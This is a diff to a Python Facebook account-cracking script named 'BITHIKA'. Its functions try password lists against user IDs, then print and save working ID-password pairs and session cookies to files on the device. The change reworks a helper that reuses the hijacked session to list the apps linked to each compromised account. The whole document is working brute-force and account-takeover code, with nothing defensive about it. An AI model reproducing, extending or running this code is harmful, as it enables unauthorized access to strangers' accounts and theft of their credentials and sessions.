@@ -701,7 +701,7 @@ def api1(ids,names,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                         open('/sdcard/BITHIKA-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
@@ -819,7 +819,7 @@ def api2(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         open('/sdcard/BITHIKA-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -928,7 +928,7 @@ def api3(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         open('/sdcard/BITHIKA-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -1039,7 +1039,7 @@ def rndm1(uid,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         return True
                         elif 'access_token' in po:
                                         cid = str(po['uid'])
@@ -1157,7 +1157,7 @@ def rndm2(uid,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         return True
                         elif 'access_token' in po:
                                         cid = str(po['uid'])
@@ -1272,7 +1272,7 @@ def rndm3(uid,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M3-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         break
                         elif 'access_token' in po:
                                         cid = str(po['uid'])
@@ -1355,7 +1355,7 @@ def rndm4(uid,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         return True
                         elif 'checkpoint' in log_cookies:
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1419,7 +1419,7 @@ def rndm5(uid,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
-                                        cek_apk(coki)
+                                        cek_apk(session, coki)
                                         return True
                         elif 'c_user' in log_cookies:
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1438,27 +1438,28 @@ def rndm5(uid,passlist):
 
 #----------------[ ID-CHECKER ]--------------------------#
 
-def cek_apk(coki):
-	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
-	except AttributeError:
-		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
-	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
-
+def cek_apk(session, coki):
+    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
+    sop = BeautifulSoup(w, "html.parser")
+    x = sop.find("form", method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game) == 0:
+        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		' % (N, H, N, H, N))
+    else:
+        print(f'\r{A} [•]%s Active Apks & Web 👇 ' % (H))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s " % (D, i + 1, game[i].replace("Ditambahkan pada", " Ditambahkan pada"), D))
+    
+    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
+    sop = BeautifulSoup(w, "html.parser")
+    x = sop.find("form", method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game) == 0:
+        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		' % (N, M, N, M, N))
+    else:
+        print(f'\r{A} [•]%s Expired Apks & Web 👇 ' % (M))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s " % (C, i + 1, game[i].replace("Kedaluwarsa", " Kedaluwarsa"), A))
 #-------------------------close-----------------------------
 if __name__ == '__main__':
     menu()
